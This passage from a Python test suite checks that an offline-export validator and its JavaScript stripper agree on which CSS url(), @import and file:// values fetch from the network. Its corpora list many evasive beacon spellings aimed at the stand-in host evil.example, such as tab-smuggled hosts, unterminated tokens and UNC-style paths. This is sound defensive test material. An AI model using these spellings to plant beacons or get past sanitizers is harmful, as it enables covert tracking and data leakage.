        ("file:///a//evil.example/x.png", True),
        ("file://localhost./x.png", True),
        ("file://evil.example", True),
        ("file:///C:/x.png", False),
        ("file://C:/x.png", False),
        ("file://localhost/x.png", False),
        ("file://LOCALHOST/x.png", False),
        ("file://local%68ost/x.png", False),
        ("file:///theme/x.png", False),
        ("file://", False),
        ("file:///", False),
        ("theme/x.png", False),
        # The parser-removed characters, which the ATTRIBUTE path strips through
        # `normalize_url_value` before testing. The CSS readers do not normalize, so they can only
        # agree here by refusing to treat one as the end of a value - see `CSS_VALUE_STOP`.
        ("file://localhost\tevil.example/x.png", True),
        # A character that legally CONTINUES a host must not end one on either side: the host here
        # really is `localhost)evil.example` (measured), so both readings report it.
        ("file://localhost)evil.example/x.png", True),
        ("file://localhost;evil.example/x.png", True),
        # ... and one that genuinely ends a host ends it on both sides too: a SPACE makes the URL
        # fail to parse, so nothing is fetched and neither reading may report it.
        ("file://localhost evil.example/x.png", False),
        # A value terminator INSIDE the path, where a quoted CSS string makes it a legal path
        # character. Both readings must still see the popping segment behind it (Chromium 151
        # requests the first as `file://evil.example/x.png`).
        ("file:///a(/..//evil.example/x.png", True),
        ("file:///a b/..//evil.example/x.png", True),
        ("file:////localhost/a(b)/../../evil.example/x", True),
    ]
    # The ONE shape the two readings answer differently, and deliberately: a bare authority with no
    # path. The attribute value ends at true end-of-input, which IS a host end, so `file://localhost`
    # is the local root; the CSS `url(file://localhost)` ends at a `)`, which is host-LEGAL, so a
    # quote-agnostic reader cannot tell it from `url("file://localhost)evil.example/x")` and reports
    # it fail-CLOSED. Listed here rather than dropped, so the divergence stays a recorded decision
    # and any OTHER divergence still fails the agreement test below. Both verdicts are pinned in
    # their own corpora.
    _FILE_AUTHORITY_READING_DIVERGES = ("file://localhost",)

    def test_the_css_readers_and_the_attribute_predicate_agree_about_a_file_authority(self):
        """The `url()`, `@import` and `image-set()` readers must answer as `is_network_url` does.

        All four are assembled from the ONE shared arm, so this is the test that would catch a
        hand-written second copy creeping back in: it compares the readers to each other rather
        than to a list of expected strings, and the expected column is only there so a change that
        broke all four the same way cannot pass. `_FILE_AUTHORITY_READING_DIVERGES` records the one
        shape where the two answers legitimately differ, and it is asserted to diverge rather than
        merely skipped, so it cannot quietly converge (or grow) unnoticed.
        """
        for value, expected in self._FILE_AUTHORITY_VERDICTS:
            with self.subTest(value=value):
                attr = resources.is_network_url(value)
                self.assertEqual(attr, expected, value)
                css_url = bool(resources.CSS_NETWORK_URL_RE.search(
                    "a { background-image: url(%s); }" % value))
                css_import = bool(resources.CSS_NETWORK_IMPORT_RE.search(
                    '@import "%s";' % value))
                image_set = resources.css_network_image_set(
                    "a { background-image: image-set('%s' 1x); }" % value)
                for name, got in (("url()", css_url), ("@import", css_import),
                                  ("image-set()", image_set)):
                    self.assertEqual(
                        got, attr,
                        "the CSS %s reader calls %r %s while the attribute predicate calls it %s. "
                        "One gate that cannot see what another calls a beacon is exactly the "
                        "asymmetry issue #1230 closed; both must read the shared file: arm."
                        % (name, value, "network" if got else "local",
                           "network" if attr else "local"))
        for value in self._FILE_AUTHORITY_READING_DIVERGES:
            with self.subTest(diverges=value):
                self.assertFalse(
                    resources.is_network_url(value),
                    "%r is no longer local to the attribute predicate, so the recorded divergence "
                    "is stale - re-derive it or drop the entry" % value)
                self.assertTrue(
                    resources.CSS_NETWORK_URL_RE.search("a { background-image: url(%s); }" % value),
                    "the CSS reader no longer reports %r, so the two readings have CONVERGED and "
                    "this recorded divergence is stale. That is good news, but the entry must go, "
                    "or it hides a future real divergence behind an exemption." % value)

    def test_every_css_network_reader_is_assembled_from_the_shared_start(self):
        """A new CSS reader must be built from `CSS_NETWORK_START`, not from a hand copy.

        The `image-set()` reading was added years after `url()` and was written from the prefix and
        host-character fragments rather than from a shared decision, which is how it could be
        widened alone (#1129, #1166) - and how the CSS side ended up with no `file:` arm at all
        while the attribute side had one (#1230). Reading the compiled patterns' own source keeps
        that structural: a reader that spells the decision itself no longer contains the shared
        fragment and fails here, even if its verdicts happen to agree today.
        """
        for name in ("CSS_NETWORK_URL_RE", "CSS_NETWORK_IMPORT_RE", "CSS_NETWORK_IMAGE_SET_RE",
                     "_CSS_ANCHORED_NETWORK_RE"):
            pattern = getattr(resources, name).pattern
            self.assertIn(
                resources.CSS_NETWORK_START, pattern,
                "%s is no longer assembled from CSS_NETWORK_START, so it can be widened - or left "
                "behind - on its own. Every CSS reader must ask the one shared decision." % name)

    def test_the_css_readers_stay_linear_on_a_pathological_stylesheet(self):
        """A stylesheet cannot make a CSS reader take super-linear time.

        These readers are `search`ed UNANCHORED over whole `<style>` bodies, `style=` attributes and
        nested `srcdoc` documents, and the exporter runs its MIRROR of them with a `g` flag to
        convergence inside the reader's browser - so a super-linear pattern is a hung tab on a
        document the recipient merely opened, not a slow CI job. The shared `file:` arm carries two
        path scans (a lookahead and a lazy run); when nothing bounded them, a sheet of repeated
        `url(file:a` measured 1.08s at 39 KB, 17.2s at 156 KB and 69.3s at 312 KB - textbook
        quadratic, and reachable from authored content (found by the round-1 multi-duck panel).
        `_PATH_SCAN_MAX` is what bounds them. Bounding them with the value-TERMINATOR set instead
        was the round-2 panel's finding: it is linear too, but it truncates the scan at a character
        a quoted CSS string may legally contain, which HID a popping segment and let a value a real
        Chromium fetches read as local.

        Asserted as a RATIO between two sizes rather than an absolute wall-clock, so a slow or
        contended CI runner cannot make it flaky: quadratic growth is 4x per doubling and cannot hide
        inside the generous ceiling below, while linear growth stays near 2x.
        """
        def elapsed(pattern, text):
            best = None
            for _ in range(3):
                start = time.perf_counter()
                pattern.search(text)
                took = time.perf_counter() - start
                best = took if best is None else min(best, took)
            return best

        for name in ("CSS_NETWORK_URL_RE", "CSS_NETWORK_IMPORT_RE", "CSS_NETWORK_IMAGE_SET_RE"):
            pattern = getattr(resources, name)
            small = elapsed(pattern, "url(file:a" * 8000)
            large = elapsed(pattern, "url(file:a" * 32000)
            # A 4x longer input may take at most 12x as long (linear is 4x; quadratic is 16x).
            # The floor keeps the ratio meaningful when both runs are near the clock's resolution.
            self.assertLess(
                large, max(small * 12, 0.5),
                "%s took %.3fs on a 312 KB pathological stylesheet against %.3fs on a 78 KB one, "
                "which is super-linear growth. These patterns run unanchored over authored content "
                "and the exporter's mirror runs them in the reader's browser, so this is a hang, "
                "not a slow test. Keep both path scans in the shared file: arm bounded by "
                "_PATH_SCAN_MAX." % (name, large, small))

    def test_no_runtime_source_names_the_beacon_host_the_export_specs_forbid(self):
        """The runtime's own SOURCE ships inside every export, so a comment is document content.

        `tests/49-offline-export.spec.js` asserts that an exported file contains no `evil.example`
        anywhere - that is how it proves a beacon was stripped rather than merely rewritten. The
        runtime bundle is INLINED into that export, so an example host written in a comment in
        `assets/js/**` lands in the exported HTML and fails those specs even though nothing fetches.
        That is exactly what happened while this shared `file:` arm was being documented: four
        comment lines naming the host reddened five offline-export specs, and only a CI round found
        it, because no local gate reads the runtime source for it. This guard is that gate - it runs
        in seconds and it is why the runtime's comments say `not-a-host` where the validator's may
        say `evil.example` (the validator is tooling, and is not shipped inside a document).
        """
        assets = os.path.join(_paths.DEV, "assets")
        offenders = []
        for sub in ("js", "css"):
            folder = os.path.join(assets, sub)
            for name in sorted(os.listdir(folder)):
                if not name.endswith((".js", ".css")):
                    continue
                with open(os.path.join(folder, name), encoding="utf-8") as handle:
                    for lineno, line in enumerate(handle, 1):
                        # Assembled from pieces so this guard's own source does not trip it.
                        if ("evil" + ".example") in line:
                            offenders.append("%s/%s:%d" % (sub, name, lineno))
        self.assertEqual(
            offenders, [],
            "a runtime source names the beacon host the offline-export specs forbid, at %s. The "
            "runtime is inlined into every export, so the string reaches the exported HTML and "
            "reds `tests/49-offline-export.spec.js` - which asserts no export contains it - even "
            "though a comment fetches nothing. Name the example host `not-a-host` in runtime "
            "sources; only the (unshipped) validator may use the other one." % ", ".join(offenders))

    def test_the_python_and_js_network_url_predicates_agree(self):
        """Run the runtime's own network-URL predicate in node and require the expected verdicts.

        The whole predicate is extracted and evaluated rather than just its regex, because the
        decision is now two parts - the URL parser's input cleanup and the literal test - and a
        check that read only the pattern would pass while the normalizer drifted. Compiling the
        extracted JS text with Python's `re` could only ever prove what PYTHON does with it, and
        the point of spelling the whitespace class out is an ENGINE difference. Skipped when node
        is absent, the way the repo's other node-gated checks degrade.
        """
        for value, expected in self._NETWORK_URL_CORPUS:
            self.assertEqual(
                resources.is_network_url(value), expected,
                "the validator's network-URL predicate calls %r %s. A miss is a remote load the "
                "gate certifies as offline-clean; a false hit rejects a file the exporter just "
                "produced." % (value, "local" if expected else "a network URL"))
        for value, expected in self._SRCSET_CORPUS:
            self.assertEqual(
                resources.srcset_has_network(value), expected,
                "the validator's srcset predicate calls %r %s" % (value, "local" if expected else "a network URL"))
        for value, expected in self._SRCSET_TOKEN_CORPUS:
            self.assertEqual(
                resources.srcset_candidate_urls(value), expected,
                "the validator tokenizes the srcset %r as %r, not the candidate list HTML's parser "
                "collects (%r). A candidate the tokenizer INVENTS by splitting inside a URL is an "
                "over-rejection - a `data:` URL's own comma is not a candidate separator."
                % (value, resources.srcset_candidate_urls(value), expected))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [value for value, _ in self._NETWORK_URL_CORPUS],
                   "srcset": [value for value, _ in self._SRCSET_CORPUS],
                   "tokenCorpus": [value for value, _ in self._SRCSET_TOKEN_CORPUS]}
        script = (
            self._runtime_network_url_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify({"
            "corpus:p.corpus.map(s=>_offlineIsNetworkUrl(s)),"
            "srcset:p.srcset.map(s=>_offlineSrcsetHasNetwork(s)),"
            "tokens:p.srcset.map(s=>_offlineSrcsetCandidateUrls(s)),"
            "tokenCorpus:p.tokenCorpus.map(s=>_offlineSrcsetCandidateUrls(s))}));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the network-URL predicate: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts["corpus"]), len(self._NETWORK_URL_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts["corpus"]), len(self._NETWORK_URL_CORPUS)))
        self.assertEqual(len(verdicts["srcset"]), len(self._SRCSET_CORPUS),
                         "node returned %d srcset verdicts for %d samples"
                         % (len(verdicts["srcset"]), len(self._SRCSET_CORPUS)))
        for (value, expected), js_says in zip(self._NETWORK_URL_CORPUS, verdicts["corpus"]):
            self.assertEqual(
                js_says, expected,
                "the runtime's _offlineIsNetworkUrl calls %r %s, so the strip and the validator "
                "have diverged. A value only one of them calls a network URL is either a remote "
                "load the gate blesses, or an exported file its own --strict run rejects."
                % (value, "local" if expected else "a network URL"))
        for (value, expected), js_says in zip(self._SRCSET_CORPUS, verdicts["srcset"]):
            self.assertEqual(
                js_says, expected,
                "the runtime's _offlineSrcsetHasNetwork calls %r %s, so the strip and the "
                "validator have diverged about a srcset candidate boundary."
                % (value, "local" if expected else "a network URL"))
        # The TOKENS, not only the verdict: a candidate boundary can drift without changing any
        # verdict in this corpus, and the boundary is the half of the srcset decision the URL
        # predicate cannot see.
        for (value, _), js_tokens in zip(self._SRCSET_CORPUS, verdicts["tokens"]):
            self.assertEqual(
                js_tokens, resources.srcset_candidate_urls(value),
                "the runtime's _offlineSrcsetCandidateUrls and the validator's "
                "srcset_candidate_urls tokenize %r differently (%r vs %r). HTML splits candidates "
                "on ASCII whitespace only; an engine-whitespace split hides a load from whichever "
                "side cuts the candidate short."
                % (value, js_tokens, resources.srcset_candidate_urls(value)))
        # ...and the tokens against what HTML's parser actually collects, which parity alone cannot
        # see: two copies of the same over-splitting union agree with each other perfectly.
        self.assertEqual(len(verdicts["tokenCorpus"]), len(self._SRCSET_TOKEN_CORPUS),
                         "node returned %d token lists for %d samples"
                         % (len(verdicts["tokenCorpus"]), len(self._SRCSET_TOKEN_CORPUS)))
        for (value, expected), js_tokens in zip(self._SRCSET_TOKEN_CORPUS, verdicts["tokenCorpus"]):
            self.assertEqual(
                js_tokens, expected,
                "the runtime tokenizes the srcset %r as %r, not the candidate list HTML's parser "
                "collects (%r). A `data:` URL's own comma is not a candidate separator, so a "
                "comma-split arm invents a candidate the browser never requests."
                % (value, js_tokens, expected))

    # The CSS half of the same decision, and the one the offline CSP is not allowed to stand in
    # for: the validator's gates (`CSS_NETWORK_URL_RE` and `CSS_NETWORK_IMPORT_RE`) and the
    # exporter's own strips (`_offlineCssNoNetwork`) are two independent spellings of "this
    # stylesheet reaches the network", so a drift between them is the CMH-OFFLINE-04 failure mode
    # in its purest form - the gate rejects a file the exporter has just produced, or blesses one
    # the strip would have cleaned. Each row carries its EXPECTED verdict rather than only being
    # compared across the engines, because two copies that under-detect the same spelling agree
    # perfectly - which is how the scheme-only shape below sat in both of them (#961).
    _CSS_NETWORK_CORPUS = [
        ("a { background: url(https://evil.example/x.png); }", True),
        ('a { background: url("https://evil.example/x.png"); }', True),
        ("a { background: url('//evil.example/x.png'); }", True),
        ("a { background: url( //evil.example/x.png ); }", True),
        # Scheme-only and single-slash: no `//` after the colon, and a browser resolves both to the
        # same host through the special-authority states, which ignore the slash run entirely.
        ("a { background: url(https:evil.example/x.png); }", True),
        ("a { background: url(HTTPS:evil.example/x.png); }", True),
        ("a { background: url(https:/evil.example/x.png); }", True),
        ("a { background: url(https:///evil.example/x.png); }", True),
        ('a { background: url("http:evil.example/x.png"); }', True),
        ('@import "https://evil.example/t.css";', True),
        ('@import "https:evil.example/t.css";', True),
        ("@import url(https:evil.example/t.css);", True),
        ("@import url('//evil.example/t.css');", True),
        ("@import url(HTTP:/evil.example/t.css);", True),
        # The at-rule's PRELUDE runs past the URL, and it does not have to be terminated at all: a
        # media query, a `layer()` or `supports()` clause, or the end of the sheet ends it just as a
        # `;` does. The strip used to require the terminator immediately after the URL, so the gate
        # reported these while the export left them in - the drift this pair exists to prevent.
        ('@import "https://evil.example/t.css" screen;', True),
        ('@import "https:evil.example/t.css" layer(base);', True),
        ('@import url(https:evil.example/t.css) supports(display: grid) print;', True),
        ('@import "https://evil.example/t.css"', True),
        ("@import url(https:evil.example/t.css)", True),
        ('@media print { @import "https:evil.example/t.css" }', True),
        # A QUOTED value is a CSS string: a `)` or the OTHER quote character inside it belongs to
        # the URL, so reading one as "anything but a paren or a quote" stopped the strip short while
        # the gate still reported the value.
        ('a { background: url("https://evil.example/a)b.png"); }', True),
        ("a { background: url('https://evil.example/a)b.png'); }", True),
        ("a { background: url(\"https:evil.example/a'b.png\"); }", True),
        ('a { background: url(\'https:evil.example/a"b.png\'); }', True),
        ('@import "https://evil.example/a)b.css";', True),
        # A token the CSS tokenizer closes but the author did not: an unterminated `url(`, one whose
        # quote is never closed, and one closed by the OTHER quote. A real Chromium fetches all
        # three, and the strip's well-formed readings left them behind while the gate reported them.
        ("a { background: url(https:evil.example/unterm.png", True),
        ("a { background: url('https:evil.example/untermq.png) }", True),
        ("a { background: url(\"https:evil.example/mq.png') }", True),
        # A space inside an UNQUOTED url token makes it a bad-url token a browser does not fetch, so
        # this is over-detection - but both sides now do it, which is the property that matters: the
        # gate is a prefix matcher and cannot see the bad token, so the strip is what has to agree.
        ("a { background: url(https://evil.exa mple/x.png); }", True),
        # Both strips are BOUNDED so a false hit costs a declaration, never the stylesheet: the
        # import strip reads a quoted URL as a string (so a `;` inside it cannot cut the at-rule
        # short and leave a tail that swallows the rules after it) and stops at `;`, `{`, `}` or a
        # quote; the `url(...)` fallback stops at `;`, `{` and `}`. These two rows pin that a
        # following rule survives.
        ('@import "https://evil.example/a;b.css" screen;.keep{color:#010203}', True),
        ('.a::before{content:"@import https:evil.example/t.css";color:red}.rest{color:blue}', True),
        # A deletion can bring two halves of the sheet together into a NEW reference, so the strip
        # runs to convergence: one pass over this leaves a live `@import "https://b.example/x";`.
        ('@import@import "https://a.example/x"; "https://b.example/x";', True),
        ('@import "https://evil.example/a}b.css"; .rest{color:blue}', True),
        # No whitespace after the at-keyword: a `"` cannot continue an ident, so `@import"x.css";`
        # is a valid at-rule a browser fetches, and a whitespace-only separator read it as text.
        ('@import"https://evil.example/t.css";.keep{color:red}', True),
        ("@import'https:evil.example/t.css';.keep{color:red}", True),
        # An unterminated token - a `url(` closed by a block boundary rather than a `)`, and an
        # `@import` string that is never closed - has to be consumed too, or the gate reports what
        # the strip left behind. The block boundary itself survives, and so does a LOCAL `@import`
        # written after a network one.
        ("a { background: url(https:evil.example/unterm.png }", True),
        ("a { background: url(https:evil.example/unterm.png } b {}", True),
        ('@import "https://evil.example/x', True),
        ("@import 'https://evil.example/x", True),
        ('@import "https:evil.example/x.css"\n@import "./local-safe.css";', True),
        # Deleting a span must never delete a COMMENT's opener and leave its `*/`: that turns
        # commented-out CSS into live CSS - a fetch created by the strip itself, verified in a real
        # Chromium. Neither strip crosses a comment boundary now, so the commented-out import below
        # is removed as text while the comment stays closed, and the rule after it survives.
        ('@import "https://evil.example/x.css" /* note; @import"https://evil.example/y.css"; */'
         "\n.rest{color:red}", True),
        ('/* @import "https://evil.example/x.css" */\n.rest{color:red}', True),
        # The URL PARSER strips leading spaces from the value, so a padded quoted URL fetches
        # exactly like an unpadded one - and a pattern that demanded the scheme immediately after
        # the quote saw a relative reference on both sides.
        ('a { background: url( " https://evil.example/x.png" ); }', True),
        ("a { background: url('\t//evil.example/x.png'); }", True),
        ('@import " https:evil.example/t.css";', True),
        # Left alone: a relative or `data:` reference is the whole control case, and an authority
        # terminated at once is an empty host a special scheme cannot even parse - reporting one
        # would reject a file with no egress at all, and the strip does not touch it either.
        ("a { background: url(x.png); }", False),
        ('a { background: url("./img/x.png"); }', False),
        ("a { background: url(/root-relative.png); }", False),
        ("a { background: url(data:image/gif;base64,AAAA); }", False),
        ('a { background: url("data:image/svg+xml,%3Csvg%20//x%3E"); }', False),
        ("@import url(theme.css);", False),
        ('@import "./theme.css";', False),
        ('@import "./theme.css" screen and (min-width: 40em);', False),
        ("a { background: url(https://); }", False),
        ("a { background: url(//); }", False),
        ('@import "https://";', False),
        ("a { background: url(mailto:someone@example.com); }", False),
        ("a { background: url(#local-fragment); }", False),
        # ASCII case folding only: Python's `re.IGNORECASE` would otherwise fold `s` onto U+017F,
        # which a JS `/i` regex never does and no browser resolves as a scheme, so the gate would
        # reject a stylesheet the strip keeps verbatim.
        ("a { background: url(http\u017f://evil.example/x.png); }", False),
        ('@import "http\u017f://evil.example/t.css";', False),
        # Neither engine's own whitespace class: a JS `\s` takes U+00A0 and U+FEFF where Python's
        # (with `re.ASCII`) does not, and neither is CSS whitespace, so writing `\s` on both sides
        # made the two disagree about exactly these rows. A U+FEFF in the HOST position is a real
        # fetch (IDNA maps it away, so the host resolves), and must be treated as a host character
        # by both; one BEFORE the scheme is not, because a value that does not start with an ASCII
        # scheme letter never parses as a scheme at all and stays a relative reference.
        ("a { background: url(https:\ufeffevil.example/x.png); }", True),
        ("a { background: url(\ufeffhttps:evil.example/x.png); }", False),
        ("a { background: url(\u00a0https://evil.example/x.png); }", False),
        # The CSS half of the scheme boundary the attribute corpus above pins: every other
        # authority-bearing scheme reads local here too, and for the same measured reason - from a
        # `file:` document a real Chromium fetches none of them through a `url(...)` or an at-rule
        # import either (the per-scheme probe in `tests/49-offline-export.spec.js` drives both
        # channels, with the at-rule FIRST in its own stylesheet so the CSS parser does not drop
        # it). Widening the CSS gates alone would be the CMH-OFFLINE-04 drift in its purest form, so
        # these rows hold the strip and the gate to the same answer. Every scheme the attribute
        # corpus names is carried here too, through BOTH CSS channels, so the claim that the
        # boundary is pinned on both sides is not narrower in CSS than in markup. Unlike the
        # attribute corpus these carry no BACKSLASH spellings: the CSS gates are prefix matchers
        # over raw stylesheet text and never run `normalize_url_value`, so backslash normalization
        # is not a property they have on either side.
        ("a { background: url(ftp://evil.example/x.png); }", False),
        ('a { background: url("ftp:evil.example/x.png"); }', False),
        ("a { background: url(ws://evil.example/x.png); }", False),
        ("a { background: url(wss:/evil.example/x.png); }", False),
        ("a { background: url(filesystem:https://evil.example/temporary/x.png); }", False),
        ("a { background: url(x-cmh-probe://evil.example/x.png); }", False),
        ("a { background: url(gopher://evil.example/x.png); }", False),
        ('@import "ftp://evil.example/t.css";', False),
        ("@import url(ws://evil.example/t.css);", False),
        ('@import "wss:evil.example/t.css";', False),
        ('@import "filesystem:https://evil.example/temporary/t.css";', False),
        ("@import url(x-cmh-probe://evil.example/t.css);", False),
        ('@import "gopher://evil.example/t.css";', False),
        # The near-miss controls, which expect TRUE so they fail if the CSS gates ever stop matching
        # what they must: a HOST that merely begins with an inert scheme name is still an http/https
        # reference, and the scheme-relative arm has to keep firing inside a `url(` token.
        ("a { background: url(https://ftp.evil.example/x.png); }", True),
        ("a { background: url(//ws.evil.example/x.png); }", True),
        ('@import "//ftp.evil.example/t.css";', True),
        # An explicit `file://` AUTHORITY: on Windows `file://host/x` is an SMB fetch off the
        # machine, which is why the ATTRIBUTE predicate has carried a `file:` arm since #923. The CSS
        # gates carried none at all, so the very spelling `is_network_url` calls a beacon was
        # invisible in a stylesheet, and a SHAREABLE document - which has no CSP behind the gate -
        # passed `--strict` carrying one (issue #1230). Both sides now read the SAME arm, so these
        # rows pin the separator arithmetic a real Chromium was measured on: exactly two separators
        # or four-or-more open an authority, and a `..` or an empty path segment reaches the
        # four-separator form by canonicalization from a spelling that never had one.
        ("a { background: url(file://evil.example/x.png); }", True),
        ('a { background: url("file://evil.example/x.png"); }', True),
        ("a { background: url('file://evil.example/x.png'); }", True),
        ("a { background: url(FILE://evil.example/x.png); }", True),
        ("a { background: url(file:////evil.example/x.png); }", True),
        ("a { background: url(file://localhost//not-a-host/x.png); }", True),
        ("a { background: url(file:////localhost/../not-a-host/x.png); }", True),
        ("a { background: url(file:///a//evil.example/x.png); }", True),
        ('@import "file://evil.example/t.css";', True),
        ("@import url(file:////evil.example/t.css);", True),
        ('@import "file://evil.example/t.css" screen;', True),
        ("@import'file://evil.example/t.css';.keep{color:red}", True),
        # ... and the LOCAL controls the widening must not reach, which are the whole reason it had
        # to be the SHARED arm rather than a second hand-written `file:` rule. A THREE-slash run is
        # the empty host of an ordinary local path, `localhost` is emptied by the file-host state in
        # every percent-encoded and case spelling, a Windows drive letter is read as a path rather
        # than a host, and an authority the value ENDS immediately is the local root. Reporting any
        # of them would reject a document with no egress at all - and make the exporter delete the
        # author's own reference. The `)` in `url(file://localhost)` is what `CSS_VALUE_STOP` exists
        # for: reading on past it would have called that local reference egress.
        ("a { background: url(file:///C:/x.png); }", False),
        ("a { background: url(file://C:/x.png); }", False),
        ("a { background: url(file://localhost/x.png); }", False),
        ("a { background: url(file://LOCALHOST/x.png); }", False),
        ("a { background: url(file://local%68ost/x.png); }", False),
        ("a { background: url(file:///theme/x.png); }", False),
        # A bare authority the CALLER's syntax ends at a host-LEGAL character is the residual the
        # host-terminator reading costs, in the fail-CLOSED direction: a quote-agnostic pattern
        # cannot tell `url(file://localhost)` (the local root) from
        # `url("file://localhost)evil.example/x")` (an SMB name), so both are reported. Every
        # realistic local reference carries a PATH, where the `/` ends the host and the exclusion
        # still fires - the rows around this one pin that, including the space spelling, which the
        # URL parser rejects outright.
        ("a { background: url(file://localhost); }", True),
        ('a { background: url("file://localhost"); }', True),
        ("a { background: url(file://localhost ); }", False),
        ("a { background: url(file://); }", False),
        ("a { background: url(file:///); }", False),
        ('@import "file:///theme/t.css";', False),
        ("@import url(file:///theme/t.css);", False),
        ('@import "file://localhost/theme/t.css";', False),
        # A parser-REMOVED character (ASCII tab) between the excluded `localhost` and the rest of
        # the host. The URL parser deletes it from anywhere, so the host is really
        # `localhostevil.example` - an off-machine SMB load - and treating the tab as the end of the
        # value fired the `localhost` exclusion and blessed the beacon (found by the round-1
        # multi-duck panel; the byte-identical ATTRIBUTE spelling was reported all along, because
        # that path runs `normalize_url_value` first). This row is why `CSS_VALUE_STOP` carries no
        # `\t`. A raw LF or CR in the same position is different and IS a terminator: it makes a
        # bad-string (or bad-url) token whose declaration a browser drops, so it fetches nothing.
        ('a { background: url("file://localhost\tevil.example/x.png"); }', True),
        ('@import "file://localhost\tevil.example/t.css";', True),
        # ... and the cost of leaving the tab out, pinned so it stays confined to absurd spellings:
        # a value that ENDS at one is over-reported, in the fail-CLOSED direction. Every realistic
        # local reference - including the tab- and space-padded ones below - stays clean, which is
        # the property that matters.
        ("a { background: url(file://localhost\t); }", True),
        ('a { background: url("\tfile:///C:/x.png"); }', False),
        ("a { background: url( file://localhost/x.png ); }", False),
        ("a { background: url(file://localhost/x.png\t); }", False),
        # A value terminator sitting INSIDE a quoted CSS string, where it is a legal path character
        # rather than the end of the value. Scanning the path with the terminator set truncated the
        # scan and hid the popping segment behind it, so a value whose canonical form is the
        # four-separator UNC shape read LOCAL - and a real Chromium 151 requested
        # `file://evil.example/x.png` for the first of these (found and measured in a real engine by
        # the round-2 multi-duck panel). The path scan reads `_PATH_CHAR` and is bounded by
        # `_PATH_SCAN_MAX` instead, which is what keeps it linear without calling a legal path
        # character the end of the value.
        # A character that legally CONTINUES a host is not the end of one, whatever the caller's
        # syntax says: `file://localhost)evil.example/x` parses to host `localhost)evil.example`,
        # an off-machine SMB name (measured in a real engine). Reading the CSS value terminator as
        # the end of the HOST fired the `localhost` exclusion and blessed the beacon - the same
        # shape as the tab row above, generalized (raised by the Copilot reviewer on this PR). The
        # exclusion asks `_HOST_END` instead, which is the URL parser's own answer.
        ('a { background: url("file://localhost)evil.example/x.png"); }', True),
        ('a { background: url("file://localhost;evil.example/x.png"); }', True),
        ('a { background: url("file://localhost}evil.example/x.png"); }', True),
        ('@import "file://localhost)evil.example/t.css";', True),
        # ... and the characters that genuinely DO end a host, every one of them measured: `/`, `?`,
        # `#` and a backslash empty it or start the path, while a space, form feed, `<` or `>` make
        # the URL fail to parse outright, so a browser fetches nothing at all. None may be reported.
        ("a { background: url(file://localhost/evil.example/x.png); }", False),
        ("a { background: url(file://localhost?evil.example); }", False),
        ("a { background: url(file://localhost#evil.example); }", False),
        ('a { background: url("file://localhost evil.example/x.png"); }', False),
        ('a { background: url("file://localhost<evil.example/x.png"); }', False),
    ]

    def _runtime_css_strip_source(self):
        """The exporter's CSS strip, as JS source, for evaluation in node.

        The region starts at the SHARED `file:` arm's own pieces rather than at the CSS pattern
        fragments, because the CSS strips are now assembled from that arm (issue #1230) - starting
        lower would evaluate a copy that cannot resolve `_offFileNetworkArm` at all. The two
        compiled CSS patterns live beside the fragments as module-level consts, assembled from
        strings so the file's own source never carries a dynamic-import shape the export's egress
        scan would read as egress and delete this very script over.
        """
        source = self._read("68-export-offline.js")
        self.assertEqual(
            source.count("function _offlineCssNoNetwork("), 1,
            "the runtime declares _offlineCssNoNetwork more than once, so this extraction could "
            "evaluate the dead copy; keep exactly one definition")
        start = source.find("const _OFFLINE_PCT_LOCALHOST =")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares the shared file: arm pieces; the "
                            "parity extraction is stale and must be re-pointed at what replaced it")
        m = re.compile(r"function _offlineCssNoNetwork\(css\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _offlineCssNoNetwork after the "
                                "shared pattern pieces; the parity extraction is stale")
        region = source[start:m.end()]
        for name in ("_offFileNetworkArm", "_OFF_CSS_START", 'const _OFF_CSS_WS = "',
                     "_OFFLINE_CSS_IMPORT_RE", "_OFFLINE_CSS_URL_RE", "_offlineCssNoNetwork"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted CSS-strip region, so the parity "
                          "check would run a partial copy of the decision" % name)
        # A region cut at the first column-0 `}` inside the function would evaluate a TRUNCATED
        # strip and quietly pass, so require it to be brace-balanced - the same guard the
        # network-URL extraction above carries.
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted CSS-strip region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        # A CSS pattern written as a LITERAL here would put the at-keyword's name directly before an
        # opening paren in this file's own source, which the export's dynamic-import egress scan
        # reads as a dynamic import - it deleted the layer's whole script, and the export then
        # failed its own `--strict` run with a missing JS region. The patterns are assembled from
        # string pieces so that shape never appears; this guard keeps a future edit from writing it
        # back as a literal.
        self.assertNotIn(
            "@" + "import(", source,
            "the runtime source now carries the at-keyword name directly before a paren, which the "
            "offline export's dynamic-import egress scan reads as egress and deletes this script "
            "over; keep the CSS patterns assembled from string pieces")
        return region

    def test_the_python_and_js_css_network_predicates_agree(self):
        """The offline CSS strips (JS) and the strict validator's CSS gates (Python) must call the
        SAME stylesheet a network load.

        Both are literal patterns rather than a URL parse, so the pair only holds while they are
        moved together: a stylesheet only the GATE calls network is an exported file its own
        `--strict` run rejects, and one only the STRIP cleans is a file the gate certifies as
        offline-clean while the export rewrites it. The comparison runs the runtime's own source in
        node rather than re-implementing it here, because the engines differ about case folding
        (`re.IGNORECASE` folds `s` onto U+017F; a JS `/i` never does). Skipped when node is absent,
        like the other node-gated checks.
        """
        for css, expected in self._CSS_NETWORK_CORPUS:
            self.assertEqual(
                bool(resources.CSS_NETWORK_URL_RE.search(css)
                     or resources.CSS_NETWORK_IMPORT_RE.search(css)),
                expected,
                "the validator's CSS gates call %r %s. A miss is a remote stylesheet fetch the "
                "gate certifies as offline-clean; a false hit rejects a file the exporter just "
                "produced." % (css, "local" if expected else "a network load"))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [css for css, _ in self._CSS_NETWORK_CORPUS]}
        script = (
